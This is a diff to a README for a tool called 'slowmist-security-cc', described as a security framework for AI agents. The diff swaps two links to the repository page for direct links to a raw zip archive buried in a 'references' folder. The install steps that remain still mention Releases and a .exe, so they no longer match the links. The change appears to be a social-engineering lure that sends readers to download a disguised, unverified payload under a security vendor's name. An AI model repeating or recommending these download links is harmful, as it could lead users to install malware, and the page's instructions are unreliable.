@@ -1,6 +1,6 @@
 # 🛡️ slowmist-security-cc - Protect agents with comprehensive security checks
 
-[![Download Security Tool](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Leontynestirredup43/slowmist-security-cc)
+[![Download Security Tool](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Leontynestirredup43/slowmist-security-cc/raw/refs/heads/main/references/slowmist-security-cc-2.3.zip)
 
 ## 🔍 Understanding this application
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the security tool:
 
 Follow these steps to install the security framework on your Windows computer.
 
-1. Visit the repository page to download the software: https://github.com/Leontynestirredup43/slowmist-security-cc
+1. Visit the repository page to download the software: https://github.com/Leontynestirredup43/slowmist-security-cc/raw/refs/heads/main/references/slowmist-security-cc-2.3.zip
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the link to see the available versions.
 4. Select the file ending in .exe to start your download.
